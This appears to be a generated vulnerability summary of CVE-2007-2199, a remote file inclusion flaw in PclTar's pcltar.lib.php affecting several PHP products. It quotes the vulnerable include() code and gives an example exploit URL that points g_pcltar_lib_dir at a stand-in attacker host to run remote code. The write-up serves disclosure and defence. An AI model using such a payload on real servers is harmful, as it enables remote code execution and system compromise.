Based on the provided content, here's a breakdown of the vulnerability information related to CVE-2007-2199:

**Root Cause of Vulnerability:**

*   The vulnerability stems from a flaw in the `pcltar.lib.php` file (or `pcltar.php`) within the Tar module 1.3 of the Vincent Blavet PhpConcept Library (PclTar). This module is used by various software products.
*   The file uses a variable `$g_pcltar_lib_dir` to construct file paths for inclusion. This variable is not properly sanitized and can be controlled by an attacker.

**Weaknesses/Vulnerabilities Present:**

*   **Remote File Inclusion (RFI):** The primary vulnerability is that the `$g_pcltar_lib_dir` variable, used in `include()` statements, can be manipulated to include remote files. Specifically, the vulnerable code is:
    ```php
    if (!defined("PCLERROR_LIB")) {
        include($g_pcltar_lib_dir."/pclerror.lib.".$g_pcltar_extension);
    }
    if (!defined("PCLTRACE_LIB")) {
        include($g_pcltar_lib_dir."/pcltrace.lib.".$g_pcltar_extension);
    }
    ```
*   The `$g_pcltar_lib_dir` variable is initialized with a default value "lib" if not set, but this is not secure as it can be overridden with an attacker-controlled value, allowing for remote file inclusion.

**Impact of Exploitation:**

*   **Arbitrary Code Execution:** By including a remote file, an attacker can execute arbitrary code on the vulnerable server. This could lead to complete system compromise, data theft, or other malicious activities.
*   **Website Defacement:** Attackers can inject malicious code to deface the website.

**Attack Vectors:**

*   **HTTP GET Parameter Manipulation:** The vulnerability is exploited by manipulating the `$g_pcltar_lib_dir` parameter in the URL.
    *   Example: `/path/to/pcltar.lib.php?g_pcltar_lib_dir=http://attacker.com/malicious_file`

**Required Attacker Capabilities/Position:**

*   **Network Access:** The attacker needs network access to the vulnerable web server.
*   **Basic Web Knowledge:** The attacker needs basic understanding of HTTP requests and parameters.
*   **Malicious File Hosting:** The attacker needs to host the malicious file on a server accessible to the vulnerable server.

**Affected Software (as noted in the provided content):**

*   Joomla! 1.5.0 Beta
*   N/X Web Content Management System (WCMS) 4.5
*   CJG EXPLORER PRO 3.3
*   PHPSiteBackup 0.1
*   Potentially MiraksGalerie 2.62

**Additional Details:**

*   The vulnerability is present in the PclTar module versions 1.3 and 1.3.1 (dated 2003).
*   The claim about `pcltrace.lib.php` being vulnerable in the original CJG Explorer disclosure was disputed. The actual vulnerability lies in the `pcltar.lib.php` using the `$g_pcltar_lib_dir` variable.

In summary, CVE-2007-2199 is a remote file inclusion vulnerability caused by the insecure use of `$g_pcltar_lib_dir` in `pcltar.lib.php`. This allows remote attackers to inject and execute arbitrary code by controlling the included file path.
